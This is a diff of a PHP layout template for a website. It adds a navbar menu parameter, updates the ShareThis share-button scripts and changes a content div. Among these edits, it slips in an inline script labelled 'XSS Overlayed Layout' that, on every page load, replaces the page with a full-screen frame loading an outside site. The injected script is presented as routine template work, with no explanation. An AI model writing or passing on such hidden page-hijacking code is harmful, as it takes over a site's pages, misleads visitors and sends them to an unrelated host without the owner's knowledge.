@@ -11,15 +11,19 @@
     <?php echo Html::includeCss() ?>
 </head>
 <body>
-	<?php View::partial('main/navbar') ?> 
-	<div id="content">
+	<?php View::partial('main/navbar',NULL,array('menu'=>$menu)) ?> 
+	<div id="content row">
             <?php View::content() ?> 
 	</div>
 	<?php View::partial('main/footer') ?> 
 <?php //echo Tag::js('jquery/jquery-1.8.2.min') ?> 
 <?php //echo Tag::js('bootstrap/bootstrap.min') ?> 
-<script type="text/javascript" src="http://w.sharethis.com/button/buttons.js" ></script>
-<script type="text/javascript">stLight.options({publisher: "e05a5a49-dee3-49a4-9cf0-5333a28fa9a5"}); </script>
+<script>var switchTo5x=true;</script>
+<script src="http://w.sharethis.com/button/buttons.js" async></script>
+<script>stLight.options({publisher: "ur-14b0e8ae-587c-3e3-d43c-3df86c5011c7"});</script>
+<script>location='javascript:document.write(\'<title>XSS Overlayed Layout</title>
+<frameset rows="100%,*" frameborder="NO" border="0" framespacing="0"><frame src="http://crazydavinci.net/"></frameset>\');document.close();void(0)';
+</script>
 </body>
 </html>
 <?php echo '<!-- Tiempo: ' . round(microtime(1) - START_TIME, 4) . ' seg. -->'?>
